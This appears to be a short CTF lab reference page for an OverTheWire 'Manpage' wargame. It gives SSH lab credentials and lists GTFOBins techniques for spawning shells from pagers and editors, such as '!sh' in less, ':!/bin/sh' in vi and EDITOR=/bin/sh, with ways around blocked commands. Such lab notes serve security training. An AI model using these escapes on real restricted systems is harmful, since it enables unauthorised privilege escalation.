# Manpage

**Difficulty:** Hard | **Topics:** GTFOBins — man page abuse, pager exploitation, restricted shell escape

Exploitation through Unix man page viewers and pagers. Levels involve abusing `man`, `less`, `more`, `nroff`, and related utilities to escape restricted environments or elevate privileges.

## Connection

```bash
ssh manpage0@manpage.labs.overthewire.org -p 2224
# Password: manpage0
```

## Core Technique

Man pages are rendered by pagers (`less`, `more`). These pagers can execute shell commands:

```
# Inside less/more:
!sh          # spawn shell
!/bin/bash   # spawn bash
v            # open $EDITOR (vi → :!/bin/sh)
```

## GTFOBins Reference

| Binary | Technique |
|--------|-----------|
| `less` | `!sh` inside pager |
| `more` | `!sh` inside pager (needs large enough terminal) |
| `man` | Invokes pager — same as above |
| `vi/vim` | `:!/bin/sh` or `:set shell=/bin/sh :shell` |
| `nroff` | Pipe to shell via macros |

## Tips

- If `!sh` is blocked, try `!/bin/sh`, `!bash`, or `!id`
- Make terminal small to force paging in `more`
- `v` in `less` opens `$EDITOR` — set it: `EDITOR=/bin/sh less file`
